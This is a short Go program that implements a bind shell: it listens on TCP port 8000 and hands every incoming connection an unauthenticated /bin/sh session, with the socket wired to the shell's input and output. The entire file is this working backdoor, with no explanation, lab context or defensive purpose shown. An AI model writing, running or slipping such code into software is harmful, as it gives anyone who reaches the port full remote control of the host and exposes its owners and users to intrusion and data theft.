package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
)

func bindShell(network, address, shell string) {
	l, err := net.Listen(network, address)
	if err != nil {
		log.Fatalln(err)
	}
	defer l.Close()
	for {
		// Wait for a connection.
		conn, _ := l.Accept()
		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		go func(c net.Conn) {
			fmt.Printf("%v", &c)
			cmd := exec.Command(shell)
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			cmd.Run()
			defer c.Close()
		}(conn)
	}
}

func main() {
	bindShell("tcp", ":8000", "/bin/sh")
}
